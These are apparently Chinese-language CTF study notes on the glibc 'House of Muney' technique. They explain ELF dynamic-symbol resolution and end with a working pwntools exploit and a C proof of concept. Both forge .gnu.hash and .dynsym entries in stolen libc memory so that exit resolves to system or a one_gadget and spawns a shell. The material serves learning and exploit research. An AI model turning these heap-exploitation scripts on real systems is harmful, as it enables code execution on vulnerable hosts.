 # House of 系列

## house of muney

### ELF文件解析

#### 节的结构

* 静态视图下，组成`elf`文件的基本单位是`section`，可以翻译为节。

* `elf`头会定义节头表(所谓的表，其实都是数组，数组的每个元素都是一个结构体，比如`dyn/rel`等)

* 节头表中定义了节的数量、每个节的类型、起始的虚拟地址。

* 与动态链接相关的节为`.dynamic`节，这里面存储这与动态链接相关的描述信息。
  * `.dynamic`实际是一个数组，数组的每一个元素对应的数据结构为：
  ```C
  typedef struct
  {
  Elf64_Sxword	d_tag;			/* Dynamic entry type. 表示的是节的类型 */ 
  union
    {
      Elf64_Xword d_val;			/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
      //这个联合体有时候表示的是这个节处在节表中的下标，有时候表示这个节的虚拟地址
    } d_un;
  } Elf64_Dyn;
  ```
  * 与符号查找相关的是`STRTAB`和`SYMTAB`节类型。
  
    * `STRTAB`：字符串表 ，包含一大串字符串，包含整个程序中所使用到的所有字符。
  
    * `SYMTAB`：符号表，包含符号的定义，其对应的数据结构为：
  
      ```c
      typedef struct {
          Elf64_Word  st_name;   // 符号名在.dynstr中的偏移
          unsigned char st_info; // 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等）
          unsigned char st_other; //通常为 0，表示符号可见性为默认（无需修改）。
          Elf64_Section st_shndx; // 符号所属的节区索引
          Elf64_Addr    st_value; // 符号的地址（如函数地址）
          Elf64_Xword   st_size;  // 符号大小
      } Elf64_Sym;
      //如果修改st_name这个下标，就能解析出不同的符号地址。
      //关于st_value,当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址，如果开启了PIE，那么符号的实际地址就是加载的基地址加上这个值。
      ```
      
      - **符号类型**：符号的绑定属性（`st_info`字段）分为：
        - **STB_LOCAL**：局部符号，仅在当前模块可见。 0x0
        - **STB_GLOBAL**：全局符号，可被其他模块引用。 0x1
        - **STB_WEAK**：弱符号，优先级低于全局符号。 0x2
  
   * 符号表和字符串表描述了怎么找到符号，但是如何标识哪些符号需要重定位，则需要使用到重定位表。
  
   * 重定位表数据结构
  
     ```C
     typedef struct
     {
       Elf64_Addr	r_offset;		/* Address */
       Elf64_Xword	r_info;			/* Relocation type and symbol index */
     } Elf64_Rel;
     ```
  
     * `r_offset`：这个值代表对应符号在`got`表中的地址。使用 `libc.got['xxx']`得到的就是这个地址。
     * `r_info`：有两部分组成，低`32`位表示重定位入口的类型，高`32`位表示这个重定位符号在符号表中的下标。
  
   * ret2plt流程图
  
     * plt[0]处代码
  
       ```asm
       push ModuleID
       jmp _dl_runtime_resolve
       ```
  
        * 第一次调用got表处代码
  
          ```asm
          push n
          jmp plt[0]
          ```
  

##### **.gnu.hash 节的结构**

`.gnu.hash` 节的结构如下（以64位ELF为例）：

1. **`nbuckets`** (4字节)：哈希桶的数量。
2. **`symndx`** (4字节)：第一个全局符号在动态符号表（`.dynsym`）中的索引。
3. **`maskwords`** (4字节)：布隆过滤器掩码的位数（以 `_wordsize` 为单位）。
4. **`shift2`** (4字节)：布隆过滤器计算的位移值。
5. **布隆过滤器数组**：每个元素大小为 `_wordsize` 字节（64位下为8字节）。
6. **哈希桶数组**：每个桶条目占4字节，指向符号链表的起始索引。
7. **哈希值数组**：每个哈希值占4字节。

### 查找函数符号真实地址流程

#### 调用大概

1. 从 `plt` 表跳转到 `got` 表

2. `push n/push ModuleID`，然后跳转到`_dl_runtime_resolve` 函数。

3. 上一步实际是找到符号的重定位表条目。在重定位表中，分别记录了解析好地址后需要回填的地址，即符号的 `got` 表地址，同时记录了符号所在的符号表的下标。

4. 动态链接器解析符号（如调用`exit`）

   1. **计算哈希值**：对符号名（如`"exit"`）计算GNU哈希值。
   2. **布隆过滤**：检查哈希值是否可能存在于哈希表中。
   3. **定位哈希桶**：根据哈希值找到对应的哈希桶（`bucket`）。
   4. **遍历哈希链**：
      - 从桶中获取链的起始索引 `chain_index`。
      - 实际符号索引 bucket = `chain_index + symoffset`。
        - `symoffset` 是 **.dynsym 中第一个全局符号的索引值**。
        - 例如，若 `.dynsym` 前5个符号是局部符号（索引0~4），第6个符号（索引5）是第一个全局符号，则 `symoffset = 5`。
      - 遍历哈希链，匹配哈希值后，通过索引在 `.dynsym` 中找到符号条目。

5. 找到符号之后，计算出真实的偏移，然后填回到 `got` 表，避免下一次重新解析

6. 调用该函数

##### .gnu.hash节中的哈希桶和 .dynsym 节的关系
```
.gnu.hash 节                          .dynsym 节
+-------------------+               +-------------------+
| 哈希桶数组         |               | Elf64_Sym[0]     |
| buckets[0]: 0     +-------------->| (局部符号，忽略)   |
| buckets[1]: 2     |               +-------------------+
| ...               |               | Elf64_Sym[1]     |
+-------------------+               | (局部符号，忽略)   |
                                    +-------------------+
哈希链数组index = bucket - symoffset  | Elf64_Sym[bucket] |
+-------------------+               | (全局符号开始)      |
| hasharr[index]:0xABC  | <---------|st_name: "exit" 	|
| hasharr[index+1]:0xDEF|           | st_value: 0x...   |
+-------------------+               +-------------------+
```

#### 细节

##### 涉及的数据结构

* `.dynamic` 实际是一个数组，数组的每一个元素对应的数据结构：

  ```C
  typedef struct
  {
    Elf64_Sxword	d_tag;			/* Dynamic entry type */
    union
      {
        Elf64_Xword d_val;		/* Integer value */
        Elf64_Addr d_ptr;			/* Address value */
      } d_un;
  } Elf64_Dyn;
  ```

* 符号表的数据结构：

  ```C
  typedef struct {
      Elf64_Word  st_name;   // 符号名在.dynstr中的偏移
      unsigned char st_info; // 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等）
      unsigned char st_other;
      Elf64_Section st_shndx; // 符号所属的节区索引
      Elf64_Addr    st_value; // 符号的地址（如函数地址）
      Elf64_Xword   st_size;  // 符号大小
  } Elf64_Sym;
  ```
  
* 重定位表的数据结构：

  ```C
  typedef struct
  {
    Elf64_Addr	r_offset;		/* Address */
    Elf64_Xword	r_info;			/* Relocation type and symbol index */
  } Elf64_Rel;
  ```

* link_map的数据结构：

  ```C
  struct symtab_cache {
      // 这里可以包含缓存相关的具体成员，如哈希表、缓存条目等
      // 简化示例中暂不详细展开
  };
  
  // 表示已找到的版本信息
  struct r_found_version {
      // 这里可以包含版本相关的具体成员，如版本号、版本标志等
      // 简化示例中暂不详细展开
  };
  
  // 链接映射结构，代表一个已加载的共享对象
  struct link_map {
      // 共享对象加载到内存中的基地址
      // 所有共享对象内的相对地址都要加上这个基地址才是实际内存地址
      ElfW(Addr) l_addr;
  
      // 指向共享对象的绝对文件名的字符串指针
      // 用于标识该共享对象是从哪个文件加载的
      char *l_name;
  
      // 指向共享对象的动态节（.dynamic 节）的指针
      // 动态节包含了共享对象动态链接相关的重要信息，如符号表、重定位表位置等
      ElfW(Dyn) *l_ld;
  
      // 指向下一个加载的共享对象的 link_map 指针
      // 用于将所有已加载的共享对象连接成一个双向链表
      struct link_map *l_next;
  
      // 指向前一个加载的共享对象的 link_map 指针
      // 用于将所有已加载的共享对象连接成一个双向链表
      struct link_map *l_prev;
  
      // 本地符号查找的缓存指针
      // 可以提高本地符号查找的效率，减少遍历符号表的次数
      struct symtab_cache *l_local_cache;
  
      // 全局符号查找的缓存指针
      // 可以提高全局符号查找的效率，减少遍历符号表的次数
      struct symtab_cache *l_global_cache;
  	l_gnu_chain_zero
      // 只读重定位（RELRO）段的起始地址
      // RELRO 段包含程序加载时已完成重定位的只读数据，有助于提高程序安全性
      ElfW(Addr) l_relro_addr;
  
      // 只读重定位（RELRO）段的大小
      ElfW(Addr) l_relro_size;
  
      // 共享对象初始化函数的地址
      // 在共享对象加载后，动态链接器会调用此函数进行初始化操作
      ElfW(Addr) l_init;
  
      // 共享对象终止函数的地址
      // 在共享对象卸载前，动态链接器会调用此函数进行清理操作
      ElfW(Addr) l_fini;
  
      // 指向实际的 link_map
      // 在某些情况下可能存在代理或虚拟的 link_map，l_real 指向真正的共享对象信息
      struct link_map *l_real;
  
      // 共享对象的类型，如可执行文件、共享库等
      // 可以通过不同的值来区分不同类型的加载对象
      int l_type;
      ... ...
  };
  ```

  

##### 细节流程

1.跳转到_dl_runtime_resolve函数后，保存各个寄存器数据，然后`call _dl_fixup` 这个函数，获取到真实的地址，把地址保存在 `r11` 寄存器中，把相关数据恢复后，直接 `jmp r11`。

```asm
Dump of assembler code for function _dl_runtime_resolve_xsavec:
   0x00007ffff7fe7bc0 <+0>:	endbr64 
   0x00007ffff7fe7bc4 <+4>:	push   rbx
   0x00007ffff7fe7bc5 <+5>:	mov    rbx,rsp
   0x00007ffff7fe7bc8 <+8>:	and    rsp,0xffffffffffffffc0
   0x00007ffff7fe7bcc <+12>:	sub    rsp,QWORD PTR [rip+0x14b35]        # 0x7ffff7ffc708 <_rtld_global_ro+232>
   0x00007ffff7fe7bd3 <+19>:	mov    QWORD PTR [rsp],rax
   0x00007ffff7fe7bd7 <+23>:	mov    QWORD PTR [rsp+0x8],rcx
   0x00007ffff7fe7bdc <+28>:	mov    QWORD PTR [rsp+0x10],rdx
   0x00007ffff7fe7be1 <+33>:	mov    QWORD PTR [rsp+0x18],rsi
   0x00007ffff7fe7be6 <+38>:	mov    QWORD PTR [rsp+0x20],rdi
   0x00007ffff7fe7beb <+43>:	mov    QWORD PTR [rsp+0x28],r8
   0x00007ffff7fe7bf0 <+48>:	mov    QWORD PTR [rsp+0x30],r9
   0x00007ffff7fe7bf5 <+53>:	mov    eax,0xee
   0x00007ffff7fe7bfa <+58>:	xor    edx,edx
   0x00007ffff7fe7bfc <+60>:	mov    QWORD PTR [rsp+0x250],rdx
   0x00007ffff7fe7c04 <+68>:	mov    QWORD PTR [rsp+0x258],rdx
   0x00007ffff7fe7c0c <+76>:	mov    QWORD PTR [rsp+0x260],rdx
   0x00007ffff7fe7c14 <+84>:	mov    QWORD PTR [rsp+0x268],rdx
   0x00007ffff7fe7c1c <+92>:	mov    QWORD PTR [rsp+0x270],rdx
   0x00007ffff7fe7c24 <+100>:	mov    QWORD PTR [rsp+0x278],rdx
   0x00007ffff7fe7c2c <+108>:	xsavec [rsp+0x40]
   0x00007ffff7fe7c31 <+113>:	mov    rsi,QWORD PTR [rbx+0x10]
   0x00007ffff7fe7c35 <+117>:	mov    rdi,QWORD PTR [rbx+0x8]
=> 0x00007ffff7fe7c39 <+121>:	call   0x7ffff7fe00c0 <_dl_fixup>
   0x00007ffff7fe7c3e <+126>:	mov    r11,rax
   0x00007ffff7fe7c41 <+129>:	mov    eax,0xee
   0x00007ffff7fe7c46 <+134>:	xor    edx,edx
   0x00007ffff7fe7c48 <+136>:	xrstor [rsp+0x40]
   0x00007ffff7fe7c4d <+141>:	mov    r9,QWORD PTR [rsp+0x30]
   0x00007ffff7fe7c52 <+146>:	mov    r8,QWORD PTR [rsp+0x28]
   0x00007ffff7fe7c57 <+151>:	mov    rdi,QWORD PTR [rsp+0x20]
   0x00007ffff7fe7c5c <+156>:	mov    rsi,QWORD PTR [rsp+0x18]
   0x00007ffff7fe7c61 <+161>:	mov    rdx,QWORD PTR [rsp+0x10]
   0x00007ffff7fe7c66 <+166>:	mov    rcx,QWORD PTR [rsp+0x8]
   0x00007ffff7fe7c6b <+171>:	mov    rax,QWORD PTR [rsp]
   0x00007ffff7fe7c6f <+175>:	mov    rsp,rbx
   0x00007ffff7fe7c72 <+178>:	mov    rbx,QWORD PTR [rsp]
   0x00007ffff7fe7c76 <+182>:	add    rsp,0x18
   0x00007ffff7fe7c7a <+186>:	bnd jmp r11
End of assembler dump.
```

2. _dl_fixup函数：

   ```C
   DL_FIXUP_VALUE_TYPE
   attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
   _dl_fixup (
   # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
   	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
   # endif
   	   struct link_map *l, ElfW(Word) reloc_arg) 
   {
     // 这里的l是二进制程序本身的link_map，而不是so的
     // 第二个参数即为push n，所查找的符号在重定位表.rel.plt中的索引
   
     // 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表
     const ElfW(Sym) *const symtab
       = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
     const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
   
     // 找到对应的重定位元素、符号表、字符串
     const PLTREL *const reloc
       = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
     const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
     const ElfW(Sym) *refsym = sym;
     // rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中
     void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
     lookup_t result;
     DL_FIXUP_VALUE_TYPE value;
   
     /* Sanity check that we're really looking at a PLT relocation.  */
     assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
   
      /* Look up the target symbol.  If the normal lookup rules are not
         used don't look in the global scope.  */
     if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
       {
         const struct r_found_version *version = NULL;
   
         if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
   	{
   	  const ElfW(Half) *vernum =
   	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
   	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
   	  version = &l->l_versions[ndx];
   	  if (version->hash == 0)
   	    version = NULL;
   	}
   
         /* We need to keep the scope around so do some locking.  This is
   	 not necessary for objects which cannot be unloaded or when
   	 we are not using any threads (yet).  */
         int flags = DL_LOOKUP_ADD_DEPENDENCY;
         if (!RTLD_SINGLE_THREAD_P)
   	{
   	  THREAD_GSCOPE_SET_FLAG ();
   	  flags |= DL_LOOKUP_GSCOPE_LOCK;
   	}
   
   #ifdef RTLD_ENABLE_FOREIGN_CALL
         RTLD_ENABLE_FOREIGN_CALL;
   #endif
   	// 第一个参数是字符串地址，根据符号表和字符串表得到的
   	// 第二个参数是link_map
   	// 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表
   	// 第四个参数是scope，表示查找的范围
   	// 第五个参数是版本信息
   	// 后面的参数都是固定的
         result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
   				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
   
         /* We are done with the global scope.  */
         if (!RTLD_SINGLE_THREAD_P)
   	THREAD_GSCOPE_RESET_FLAG ();
   
   #ifdef RTLD_FINALIZE_FOREIGN_CALL
         RTLD_FINALIZE_FOREIGN_CALL;
   #endif
   
         /* Currently result contains the base load address (or link map)
   	 of the object that defines sym.  Now add in the symbol
   	 offset.  */
         value = DL_FIXUP_MAKE_VALUE (result,
   				   SYMBOL_ADDRESS (result, sym, false));
       }
     else
       {
         /* We already found the symbol.  The module (and therefore its load
   	 address) is also known.  */
         value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
         result = l;
       }
   
     /* And now perhaps the relocation addend.  */
     value = elf_machine_plt_value (l, reloc, value);
   
     if (sym != NULL
         && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
       value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
   
     /* Finally, fix up the plt itself.  */
     if (__glibc_unlikely (GLRO(dl_bind_not)))
       return value;
   	// 修正got表条目
     return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
   } 
   ```

   3.调用_dl_lookup_symbol_x 函数 在各个so的link_map寻找对应符号,但是实际调用do_lookup_x函数

   ```C
   Cstatic int
   __attribute_noinline__
   do_lookup_x (const char *undef_name, uint_fast32_t new_hash,
   	     unsigned long int *old_hash, const ElfW(Sym) *ref,
   	     struct sym_val *result, struct r_scope_elem *scope, size_t i,
   	     const struct r_found_version *const version, int flags,
   	     struct link_map *skip, int type_class, struct link_map *undef_map)
   {
     size_t n = scope->r_nlist; //r_nlist是动态库link_map的数量，每个动态库都有一个link_map
     /* Make sure we read the value before proceeding.  Otherwise we
        might use r_list pointing to the initial scope and r_nlist being
        the value after a resize.  That is the only path in dl-open.c not
        protected by GSCOPE.  A read barrier here might be to expensive.  */
     __asm volatile ("" : "+r" (n), "+m" (scope->r_list));
     struct link_map **list = scope->r_list;//存放每个link_map的地址数组
   
     do
       {
         const struct link_map *map = list[i]->l_real; //l_real 是 struct link_map 结构体中的一个成员，通常指向该动态链接库实际对应的 link_map。
   
         /* Here come the extra test needed for `_dl_lookup_symbol_skip'.  */
         if (map == skip)
   	continue;
   
         /* Don't search the executable when resolving a copy reloc.  */
         if ((type_class & ELF_RTYPE_CLASS_COPY) && map->l_type == lt_executable)
   	continue;
   
         /* Do not look into objects which are going to be removed.  */
         if (map->l_removed)
   	continue;
   
         /* Print some debugging info if wanted.  */
         if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_SYMBOLS))
   	_dl_debug_printf ("symbol=%s;  lookup in file=%s [%lu]\n",
   			  undef_name, DSO_FILENAME (map->l_name),
   			  map->l_ns);
   
         /* If the hash table is empty there is nothing to do here.  */
         if (map->l_nbuckets == 0)
   	continue;
   
         Elf_Symndx symidx;
         int num_versions = 0;
         const ElfW(Sym) *versioned_sym = NULL;
   
         /* The tables for this map.  */
         // 找到符号表和字符串表（当前link_map）
         const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);
         const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);
   
         const ElfW(Sym) *sym;
         // 获取bitmask
         const ElfW(Addr) *bitmask = map->l_gnu_bitmask;
         if (__glibc_likely (bitmask != NULL))
   	{
         // 获取bitmask_word，这里需要伪造，//bitmask_word用来判断new_hash是否哈希表中
         // new_hash的计算：int_fast32_t new_hash = _dl_elf_hash (undef_name);
         // undef_name 符号名称。
   	  ElfW(Addr) bitmask_word
   	    = bitmask[(new_hash / __ELF_NATIVE_CLASS)
   		      & map->l_gnu_bitmask_idxbits];
   		
   	  unsigned int hashbit1 = new_hash & (__ELF_NATIVE_CLASS - 1);
   	  unsigned int hashbit2 = ((new_hash >> map->l_gnu_shift)
   				   & (__ELF_NATIVE_CLASS - 1));
   
   	  if (__glibc_unlikely ((bitmask_word >> hashbit1)
   				& (bitmask_word >> hashbit2) & 1))
   	    {
           // 获取bucket，这里需要伪造
           // 获取符号所在的桶（bucket）
           // map->l_gnu_buckets 是 GNU 哈希表的桶数组
           // new_hash % map->l_nbuckets 计算出符号在桶数组中的索引
           // 将该索引对应的桶的值赋给 bucket
           // 这里代码注释提到需要伪造，可能是在某些特殊调试或模拟场景下的情况
   	      Elf32_Word bucket = map->l_gnu_buckets[new_hash
   						     % map->l_nbuckets];
   	      if (bucket != 0)
   		{
             // hasharr，这里也需要伪造对应的值
             // 这里注释提到 hasharr 需要伪造对应的值，可能是在某些特殊调试或模拟场景下的情况
           // 从 GNU 哈希表的链数组中获取当前桶对应的起始位置
           // map->l_gnu_chain_zero 是 GNU 哈希表的链数组起始地址
           // bucket 是前面计算得到的符号所在的桶的索引
           // 通过 &map->l_gnu_chain_zero[bucket] 获取该桶对应的链的起始指针
   		  const Elf32_Word *hasharr = &map->l_gnu_chain_zero[bucket];
   		// 使用 do-while 循环遍历当前桶对应的链，查找匹配的符号
   		  do
   		    if (((*hasharr ^ new_hash) >> 1) == 0)
   		      // 根据当前链节点的信息计算符号在符号表中的索引
                   // ELF_MACHINE_HASH_SYMIDX 是一个宏，用于根据不同的 ELF 机器类型计算符号索引
                   // map 是当前共享对象的 link_map 结构体指针
                   // hasharr 是当前链节点的指针
                   symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr);
   
                   // 调用 check_match 函数检查当前符号是否真正匹配要查找的符号
                   // undef_name 是要查找的未定义符号的名称
                   // ref 是引用符号的符号表项指针
                   // version 用于存储找到的符号的版本信息
                   // flags 是查找标志，控制查找的行为
                   // type_class 是符号类型类别
                   // &symtab[symidx] 是当前可能匹配的符号在符号表中的项
                   // symidx 是符号在符号表中的索引
                   // strtab 是字符串表指针，用于获取符号名称
                   // map 是当前共享对象的 link_map 结构体指针
                   // &versioned_sym 用于存储版本化符号的信息
                   // &num_versions 用于存储版本数量信息
                   sym = check_match (undef_name, ref, version, flags,
                                      type_class, &symtab[symidx], symidx,
                                      strtab, map, &versioned_sym,
                                      &num_versions);
   
                   // 如果 check_match 函数返回非空指针，说明找到了匹配的符号
                   if (sym != NULL)
                   {
                       // 跳转到 found_it 标签处，进行后续处理
                       goto found_it;
                   }
               }
               // 移动到链中的下一个节点
               // (*hasharr++ & 1u) 用于检查当前链节点是否是链中的最后一个节点
               // 如果最后一位为 0，则表示不是最后一个节点，继续循环查找
   		  while ((*hasharr++ & 1u) == 0);
   		}
   	    }
             //....
     }
   ```

####

### 利用攻击

#### 利用流程

1. malloc > 128k的内存
2. 修改该chunk的size，使其大到能覆盖掉libc的一些地址
3. free该地址
4. 然后malloc 更大的内存
5. 计算当前chunk的地址到libc的地址距离 （调试得出，第一步malloc时，取libc的地址 - (第四步malloc的地址+0x10)）
6. 计算到布隆过滤器(bitmask)数组的偏移 （`.gnu.hash的地址  + 16`）
7. 计算到哈希桶(bucket)数组的偏移 ( `bloom 的偏移 + bloom_size * 8`)
8. 计算bitmask_word的在bitmask中index
9. 计算bitmask_word的地址
10. 获取bitmask_word的值 
11. 计算目标符号在哈希桶中的index  (exit_hash % 桶数(nbucket))
12. 计算该bucket的地址
13. 获取buket的值，为目标符号在buket中的值。
14. 计算到`l_gnu_chain_zero`哈希链数组（GNU 哈希表的链数组起始地址）的距离
15. 计算到目标符号的符号表的偏移
16. 伪造符号表的数据结构，将st_value伪造成目标地址，如one_gadget,system的偏移地址。

为什么不直接伪造st_value,在偷libc的地址的时候，偷到的内存会被清空，所以需要重新伪造。

##### 某题：exp

``` python
from pwn import *
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")

def add(index, size):
 io.sendlineafter(b"option:", b"1")
 io.sendlineafter(b"ID:", str(index).encode())
 io.sendlineafter(b"size:", str(size).encode())
def free(index):
 io.sendlineafter(b"option:", b"2")
 io.sendlineafter(b"remove:", str(index).encode())
def edit(index, offset, content):
 io.sendlineafter(b"option:", b"3")
 io.sendlineafter(b"update:", str(index).encode())
 io.sendlineafter(b"length:", str(offset).encode())
 io.sendafter(b"details:", content)
def show(index):
 io.sendlineafter(b"option:", b"4")
 io.sendlineafter(b"view:", str(index).encode())
def dbg():
 gdb.attach(io)
 pause()

add(0, 0x40000 - 0x2000)
#dbg()
edit(0,-8, p64(0x41002 + 0x5000 + 0x4000))
free(0)
add(0, 0x41000 * 2 + 0x4000)
base_off = 0x7dff0
one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1]
gnu_hash_section = libc.get_section_by_name('.gnu.hash')
dynsym_section = libc.get_section_by_name('.dynsym')
dynstr_section = libc.get_section_by_name('.dynstr')
namehash = gnu_hash_section.gnu_hash('exit')

# gnu_hash_section['sh_addr']获得gun.hash偏移。
bloom_off = gnu_hash_section['sh_addr'] + 4 * gnu_hash_section._wordsize

bucket_off = bloom_off + gnu_hash_section.params['bloom_size'] * gnu_hash_section._xwordsize

bloom_elem_idx = int(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params['bloom_size']

bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize

bloom_elem_val = gnu_hash_section.params['bloom'][bloom_elem_idx]

bucket_elem_idx = namehash % gnu_hash_section.params['nbuckets']

bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize

bucket_elem_val = gnu_hash_section.params['buckets'][bucket_elem_idx]

hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params['symoffset']) * gnu_hash_section._wordsize

sym_off = dynsym_section['sh_offset'] + bucket_elem_val * dynsym_section['sh_entsize']
sym_value = b''
sym_value += p32(libc.search(b'exit\x00').__next__() - dynstr_section['sh_offset']) # st_name
sym_value += p8(0x12) # st_info 高4位：0x1 表示 STB_GLOBAL（全局符号）低4位：0x2 表示 STT_FUNC（函数类型）
sym_value += p8(0) # st_other 通常为0
sym_value += p16(1) # st_shndx 1表示在代码节中
sym_value += p64(one_gadget) # st_value
sym_value += p64(100) # st_size  随意设置,动态链接器通常不验证此字段
#dbg()
edit(0, base_off + bloom_elem_off, p64(bloom_elem_val))
edit(0, base_off + bucket_elem_off, p32(bucket_elem_val))
edit(0, base_off + hasharr_off, p32(namehash))
edit(0, base_off + sym_off, sym_value)
#gdb.attach(io, "b _dl_fixup\nc")
io.sendlineafter(b"option:", b"5")
io.interactive()
```



#### POC

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

void main()
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    char *strptr = mmap(0xdeadb000, 0x1000, 6, 0x22, -1, 0);
    strcpy(strptr, "/bin/sh");

    puts("[*] step1: allocate a chunk ---> void* ptr = malloc(0x40000);");
    size_t *ptr = (size_t *)malloc(0x40000);
    
    size_t sz = ptr[-1];
    printf("[*] ptr address: %p, chunk size: %p\n", ptr, (void *)sz);
    
    puts("[*] step2: change the size of the chunk ---> ptr[-1] += 0x5000;");
    ptr[-1] += 0x5000;
    
    puts("[*] step3: free ptr and steal heap from glibc ---> free(ptr);");
    free(ptr);

    puts("[*] step4: retrieve heap ---> ptr = malloc(0x41000 * 2);");
    ptr = malloc(0x41000 * 2);
    
    sz = ptr[-1];
    printf("[*] ptr address: %p, chunk size: %p\n", ptr, (void *)sz);

    // 当前ptr到原有libc基地址的偏移
    size_t base_off = 0x7dff0;
    // 以下地址均是相对于libc基地址的偏移
    size_t system_off = 0x52290;
    size_t bitmask_word_off = 0xb88;
    size_t bucket_off = 0xcb0; 
    size_t exit_sym_st_value_off = 0x4d20;
    size_t hasharr_off = 0x1d7c;

    puts("[*] step5: set essential data for dl_runtime_resolve");

    *(size_t *)((char *)ptr + base_off + bitmask_word_off) = 0xf000028c0200130eul;
    puts("[*] set bitmask_word to 0xf000028c0200130eul");

    *(unsigned int *)((char *)ptr + base_off + bucket_off) = 0x86u;
    puts("[*] set bucket to 0x86u");

    *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off) = system_off;
    puts("[*] set exit@sym.st_value to system_off 0x52290");

    *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off - 8) = 0xf001200002efbul;
    puts("[*] set other exit@sym members");

    *(size_t *)((char *)ptr + base_off + hasharr_off) = 0x7c967e3e7c93f2a0ul;
    puts("[*] set hasharr to 0x7c967e3e7c93f2a0ul");

    puts("[*] step6: get shell ---> exit(\"/bin/sh\")");
    exit(strptr);
}
```



